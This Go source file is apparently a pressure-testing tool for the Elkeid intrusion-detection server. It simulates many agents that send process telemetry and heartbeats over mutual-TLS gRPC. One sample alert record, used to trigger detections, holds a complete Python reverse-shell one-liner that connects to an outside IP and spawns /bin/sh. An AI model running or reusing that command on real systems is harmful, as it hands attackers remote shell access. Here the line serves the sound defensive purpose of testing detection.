package main

import (
	"context"
	"crypto/tls"
	"crypto/x509"
	"flag"
	"fmt"
	"math/rand"
	"os"
	"os/signal"
	"sync"
	"time"

	"github.com/bytedance/Elkeid/agent/proto"
	"github.com/google/uuid"
	"google.golang.org/grpc"
	"google.golang.org/grpc/credentials"
)

var (
	caPath                 = flag.String("ca", "./ca.crt", "")
	certPath               = flag.String("cert", "./client.crt", "")
	privkeyPath            = flag.String("privkey", "./client.key", "")
	svrTarget              = flag.String("svr", "", "")
	numAgent               = flag.Int("num", 10, "")
	tps                    = flag.Int("tps", 100, "")
	vulnRate               = flag.Uint("rate", 10000, "产生告警的原始数据概率，10000代表概率为万分之一")
	driverNormalPayload, _ = (&proto.Payload{
		Fields: map[string]string{
			"argv":        "elkeid-pressure",
			"comm":        "elkeid-pressure",
			"data_type":   "59",
			"dip":         "-1",
			"dport":       "-1",
			"exe":         "/usr/bin/elkeid-pressure",
			"exe_hash":    "4923962ec8e06851",
			"ld_preload":  "-1",
			"nodename":    "/usr/bin/elkeid-pressure",
			"pgid":        "916106",
			"pgid_argv":   "elkeid-pressure --elkeid-pressure",
			"pid":         "916106",
			"pid_tree":    "916106.elkeid-pressure\u003c915077.elkeid-pressure\u003c1892369.elkeid-pressure\u003c1.systemd",
			"pns":         "4026531836",
			"pod_name":    "-3",
			"ppid":        "915077",
			"ppid_argv":   "elkeid-pressure --elkeid-pressure",
			"res":         "0",
			"root_pns":    "4026531836",
			"run_path":    "/root",
			"sa_family":   "-1",
			"sessionid":   "735",
			"sid":         "915077",
			"sip":         "-1",
			"socket_argv": "-3",
			"socket_pid":  "-1",
			"sport":       "-1",
			"ssh":         "100.100.100.100 32612 100.100.100.100 22",
			"stdin":       "/dev/pts/12",
			"stdout":      "/dev/pts/12",
			"tags":        "",
			"tgid":        "916106",
			"tty":         "pts12",
			"uid":         "0",
			"username":    "root",
		},
	}).Marshal()
	driverVulnPayload, _ = (&proto.Payload{
		Fields: map[string]string{
			"argv":                        "/bin/sh -i",
			"comm":                        "sh",
			"data_type":                   "59",
			"dip":                         "123.56.98.72",
			"dport":                       "20020",
			"exe":                         "/bin/dash",
			"exe_hash":                    "b32711b67979264a",
			"ld_preload":                  "-1",
			"nodename":                    "n174-230-091",
			"pgid":                        "250668",
			"pgid_argv":                   "-3",
			"pid":                         "3290165",
			"pid_tree":                    "3290165.sh<3290094.python<3290091.sh<3290025.python<285618.bytefaasd<251597.runtime-agent<250668.dumb-init<250348.containerd-shim<1.systemd",
			"pns":                         "4026534767",
			"pod_name":                    "",
			"ppid":                        "3290094",
			"ppid_argv":                   "python -c import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"123.56.98.72\",20020));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);",
			"res":                         "0",
			"root_pns":                    "4026531836",
			"run_path":                    "/opt/bytefaas",
			"sa_family":                   "2",
			"sessionid":                   "4294967295",
			"sid":                         "250668",
			"sip":                         "10.174.230.91",
			"socket_argv":                 "-3",
			"socket_pid":                  "3290165",
			"sport":                       "62048",
			"ssh":                         "-1",
			"stdin":                       "socket:[3034122298]",
			"stdout":                      "socket:[3034122298]",
			"tgid":                        "3290165",
			"tty":                         "-1",
			"uid":                         "1000",
			"username":                    "tiger",
		},
	}).Marshal()
	heartbeatPayload, _ = (&proto.Payload{
		Fields: map[string]string{
			"config_update_time": "1639485889",
			"cpu":                "0.00217755",
			"create_at":          "1639472662",
			"du":                 "18259630",
			"fd_cnt":             "15",
			"grs":                "26",
			"idc":                "lf",
			"kernel_version":     "4.19.117.bsk.10-amd64",
			"load_1":             "0",
			"load_15":            " 0.06",
			"load_5":             " 0.02",
			"net_mode":           "findyou",
			"nproc":              "4",
			"pid":                "2413",
			"platform":           "debian",
			"platform_family":    "debian",
			"platform_version":   " 10.11",
			"arch":               "x86_64",
			"boot_at":            "1639472645",
			"read_speed":         "0",
			"region":             "CN",
			"rss":                "29024256",
			"running_procs":      "2",
			"rx_speed":           "0",
			"rx_tps":             "0",
			"started_at":         "1639472661",
			"total_procs":        "586",
			"tx_speed":           " 3478.2808477",
			"tx_tps":             "20.41665208",
			"write_speed":        "136.53323576",
		},
	}).Marshal()
	pluginPayload1, _ = (&proto.Payload{
		Fields: map[string]string{
			"cpu":         " 0.00033501",
			"du":          "8497475",
			"fd_cnt":      "9",
			"name":        "1",
			"net_mode":    "findyou",
			"pid":         "526826",
			"pversion":    "1.0.0.63",
			"read_speed":  "0",
			"rss":         "17661952",
			"running":     "true",
			"rx_speed":    "0",
			"rx_tps":      "0",
			"started_at":  "1639485909",
			"tx_speed":    "0",
			"tx_tps":      "0",
			"write_speed": "0",
		},
	}).Marshal()
	pluginPayload2, _ = (&proto.Payload{
		Fields: map[string]string{
			"cpu":         " 0.00033501",
			"du":          "8497475",
			"fd_cnt":      "9",
			"name":        "2",
			"net_mode":    "findyou",
			"pid":         "526826",
			"pversion":    "1.0.0.63",
			"read_speed":  "0",
			"rss":         "17661952",
			"running":     "true",
			"rx_speed":    "0",
			"rx_tps":      "0",
			"started_at":  "1639485909",
			"tx_speed":    "0",
			"tx_tps":      "0",
			"write_speed": "0",
		},
	}).Marshal()
	pluginPayload3, _ = (&proto.Payload{
		Fields: map[string]string{
			"cpu":         " 0.00033501",
			"du":          "8497475",
			"fd_cnt":      "9",
			"name":        "3",
			"net_mode":    "findyou",
			"pid":         "526826",
			"pversion":    "1.0.0.63",
			"read_speed":  "0",
			"rss":         "17661952",
			"running":     "true",
			"rx_speed":    "0",
			"rx_tps":      "0",
			"started_at":  "1639485909",
			"tx_speed":    "0",
			"tx_tps":      "0",
			"write_speed": "0",
		},
	}).Marshal()
)

func SendDriverData(client proto.Transfer_TransferClient, id string) (int, error) {
	recs := []*proto.EncodedRecord{}
	for i := 0; i < *tps; i++ {
		if rand.Intn(int(*vulnRate)) == 0 {
			recs = append(recs, &proto.EncodedRecord{
				DataType:  59,
				Timestamp: time.Now().Unix(),
				Data:      driverVulnPayload,
			})
		} else {
			recs = append(recs, &proto.EncodedRecord{
				DataType:  59,
				Timestamp: time.Now().Unix(),
				Data:      driverNormalPayload,
			})
		}
	}
	pkg := &proto.PackagedData{
		Records: recs,
		AgentId: id,
	}
	return pkg.Size(), client.Send(pkg)
}
func SendHeartbeatData(client proto.Transfer_TransferClient, id string) (int, error) {
	recs := []*proto.EncodedRecord{
		{
			DataType:  1000,
			Timestamp: time.Now().Unix(),
			Data:      heartbeatPayload,
		}, {
			DataType:  1001,
			Timestamp: time.Now().Unix(),
			Data:      pluginPayload1,
		}, {
			DataType:  1001,
			Timestamp: time.Now().Unix(),
			Data:      pluginPayload2,
		}, {
			DataType:  1001,
			Timestamp: time.Now().Unix(),
			Data:      pluginPayload3,
		},
	}
	pkg := &proto.PackagedData{
		Records: recs,
		AgentId: id,
	}
	return pkg.Size(), client.Send(pkg)
}
func init() {
	rand.Seed(time.Now().UnixMicro())
}
func main() {
	flag.Parse()
	ca, err := os.ReadFile(*caPath)
	if err != nil {
		panic(err)
	}
	cert, err := os.ReadFile(*certPath)
	if err != nil {
		panic(err)
	}
	privkey, err := os.ReadFile(*privkeyPath)
	if err != nil {
		panic(err)
	}
	certPool := x509.NewCertPool()
	certPool.AppendCertsFromPEM(ca)
	keyPair, err := tls.X509KeyPair(cert, privkey)
	if err != nil {
		panic(err)
	}
	ctx, cancel := signal.NotifyContext(context.Background(), os.Interrupt)
	defer cancel()
	wg := &sync.WaitGroup{}
	wg.Add(*numAgent)
	for i := 0; i < *numAgent; i++ {
		id := uuid.New().String()
		go func(id string, i int) {
			defer wg.Done()
			conn, err := grpc.Dial(*svrTarget, grpc.WithTransportCredentials(credentials.NewTLS(&tls.Config{
				Certificates: []tls.Certificate{keyPair},
				ServerName:   "elkeid.com",
				ClientAuth:   tls.RequireAndVerifyClientCert,
				RootCAs:      certPool,
			})))
			if err != nil {
				panic(err)
			}
			client, err := proto.NewTransferClient(conn).Transfer(ctx)
			if err != nil {
				panic(err)
			}
			driverTicker := time.NewTicker(time.Second)
			defer driverTicker.Stop()
			heatbeatTicker := time.NewTicker(time.Minute)
			defer heatbeatTicker.Stop()
			fmt.Printf("%v:%v agent has started\n", i, id)
			for {
				select {
				case <-ctx.Done():
					fmt.Printf("%v:%v agent will exited\n", i, id)
					return
				case <-driverTicker.C:
					len, err := SendDriverData(client, id)
					if err == nil {
						fmt.Printf("%v:%v agent send driver data succ,len %v\n", i, id, len)
					} else {
						fmt.Printf("%v:%v agent send driver data failed: %v\n", i, id, err)
					}
				case <-heatbeatTicker.C:
					len, err := SendHeartbeatData(client, id)
					if err == nil {
						fmt.Printf("%v:%v agent send heartbeat data succ,len %v\n", i, id, len)
					} else {
						fmt.Printf("%v:%v agent send heartbeat data failed: %v\n", i, id, err)
					}
				}
			}
		}(id, i)
	}
	wg.Wait()
	fmt.Println("main func exited")
}
